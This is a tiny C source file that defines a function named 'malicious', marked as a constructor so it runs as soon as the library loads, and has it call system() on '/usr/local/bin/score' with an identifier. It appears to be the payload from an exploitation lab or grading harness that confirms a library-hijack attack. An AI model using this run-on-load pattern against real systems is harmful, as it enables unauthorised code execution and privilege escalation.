#include<stdio.h>
#include<stdlib.h>
 
static void malicious() __attribute__((constructor));
 
void malicious() {
    system("/usr/local/bin/score d61e1c21-74ef-4703-8640-37a5f2e3dc48");
}
